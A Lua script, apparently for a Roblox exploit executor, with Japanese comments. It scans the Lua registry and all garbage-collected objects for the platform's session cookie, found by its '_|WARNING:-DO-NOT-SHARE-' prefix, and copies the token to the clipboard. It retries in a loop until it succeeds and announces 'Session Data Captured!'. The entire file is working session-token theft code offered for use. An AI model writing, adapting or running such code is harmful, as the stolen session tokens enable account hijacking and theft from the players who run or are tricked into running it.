-- [[ Project: Root Session Distiller ]]
print("[SYSTEM] UIを介さず、セッションから直接抽出を開始します...")

local function deep_distill()
    -- ターゲットとなるクッキーの接頭辞
    local target = "_|WARNING:-DO-NOT-SHARE-"
    
    -- 1. getreg (Luaレジストリ) を最優先でスキャン
    for _, v in pairs(getreg()) do
        if type(v) == "string" and #v > 500 then
            if string.find(v, target, 1, true) then
                local _, pos = string.find(v, "|_", 1, true)
                if pos then
                    setclipboard(string.sub(v, pos + 1))
                    return true
                end
            end
        end
    end

    -- 2. getgc(true) (全オブジェクト) をスキャン
    for _, v in pairs(getgc(true)) do
        if type(v) == "string" and #v > 500 then
            if string.find(v, target, 1, true) then
                local _, pos = string.find(v, "|_", 1, true)
                if pos then
                    setclipboard(string.sub(v, pos + 1))
                    return true
                end
            end
        end
    end
    
    return false
end

-- 負荷を抑えつつ、見つかるまで執拗に回す
task.spawn(function()
    local attempts = 0
    while true do
        if deep_distill() then
            print("********************************")
            print("SUCCESS: Session Data Captured!")
            print("画面が黒いままでも、裏で回収完了だぜ。")
            print("********************************")
            break
        end
        
        attempts = attempts + 1
        if attempts % 10 == 0 then
            print("[DEBUG] スキャン中... 何か適当にメニューを開閉してくれ")
        end
        task.wait(5)
    end
end)
